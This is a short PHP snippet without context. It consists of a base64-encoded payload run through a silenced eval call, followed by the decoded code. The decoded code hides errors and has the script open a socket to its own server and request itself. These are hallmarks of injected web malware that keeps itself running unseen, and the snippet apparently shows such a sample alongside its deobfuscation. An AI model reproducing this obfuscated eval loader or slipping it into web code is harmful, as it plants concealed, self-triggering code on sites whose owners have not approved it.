 @eval( base64_decode('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpOwplcnJvcl9yZXBvcnRpbmcoMCk7CiRoID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOwokcCA9ICRfU0VSVkVSWydTRVJWRVJfUE9SVCddOwokZnAgPSBmc29ja29wZW4oJGgsICRwLCAkZXJybm8sICRlcnJzdHIsIDUpOwppZiAoISRmcCkgewp9IGVsc2UgewoJJG91dCA9ICJHRVQgeyRfU0VSVkVSWydTQ1JJUFRfTkFNRSddfSBIVFRQLzEuMVxyXG4iOwoJJG91dCAuPSAiSG9zdDogeyRofVxyXG4iOwoJJG91dCAuPSAiQWNjZXB0LUVuY29kaW5nOiBjb21wcmVzcyxnemlwXHJcbiI7Cgkkb3V0IC49ICJDb25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIjsKIAoJZndyaXRlKCRmcCwgJG91dCk7CglmY2xvc2UoJGZwKTsKfQ=='));



@ini_set("display_errors","0");
error_reporting(0);
$h = $_SERVER['HTTP_HOST'];
$p = $_SERVER['SERVER_PORT'];
$fp = fsockopen($h, $p, $errno, $errstr, 5);
if (!$fp) {
} else {
        $out = "GET {$_SERVER['SCRIPT_NAME']} HTTP/1.1\r\n";
        $out .= "Host: {$h}\r\n";
        $out .= "Accept-Encoding: compress,gzip\r\n";
        $out .= "Connection: Close\r\n\r\n";

        fwrite($fp, $out);
        fclose($fp);
}